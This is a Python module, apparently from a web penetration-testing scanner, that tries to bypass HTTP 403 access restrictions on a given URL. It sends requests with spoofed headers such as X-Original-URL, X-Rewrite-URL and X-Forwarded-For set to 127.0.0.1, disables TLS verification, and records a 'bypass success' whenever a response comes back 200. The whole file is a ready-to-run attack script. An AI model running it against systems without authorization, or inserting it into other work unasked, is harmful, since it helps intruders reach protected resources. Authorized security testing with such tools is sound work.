from __future__ import annotations

import httpx


class BypassModule:
    """
    Attempts common 403 bypass header tricks against a single URL.
    """

    name = "bypass_403"
    depends_on: list[str] = []

    def __init__(self, url: str, enabled: bool = True, timeout: float = 8.0):
        self.url = url
        self.enabled = enabled
        self.timeout = timeout

    async def run(self, ctx) -> None:
        if not self.enabled:
            return
        if not self.url:
            return

        headers_list = [
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Original-URL": "/"},
            {"X-Rewrite-URL": "/"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Forwarded-Proto": "https"},
            {"Referer": self.url},
        ]

        log = getattr(ctx, "log", lambda m: None)
        findings = getattr(ctx, "findings", None)

        async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=self.timeout) as client:
            for headers in headers_list:
                try:
                    resp = await client.get(self.url, headers=headers)
                except httpx.HTTPError as exc:
                    log(f"[Bypass] {self.url} attempt {headers} failed: {exc}")
                    continue

                log(f"[Bypass] {self.url} {headers} -> {resp.status_code}")
                if resp.status_code == 200:
                    msg = f"[Bypass] 403 bypass success via headers {headers}"
                    log(msg)
                    if isinstance(findings, list):
                        findings.append(msg)
                    return
